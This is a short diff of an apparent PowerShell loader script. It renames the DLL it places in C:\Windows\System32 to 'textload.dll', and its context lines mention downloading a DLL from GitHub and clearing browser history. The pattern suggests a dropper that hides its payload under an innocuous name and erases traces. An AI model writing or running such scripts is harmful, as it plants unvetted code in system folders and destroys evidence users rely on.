@@ -14,7 +14,7 @@ if ($proc) {
 }
 
 # DLL download path (System32)
-$LocalDLL_Path = "C:\Windows\System32\waplod.dll"
+$LocalDLL_Path = "C:\Windows\System32\textload.dll"
 # =============================================== #
 
 Write-Host "[*] Downloading DLL from GitHub..."
@@ -129,5 +129,6 @@ try {
 } catch { Write-Host "[-] Browser history clear failed: $_" }
 
 Write-Host "✅ Cleaning Complete"
+
 
 
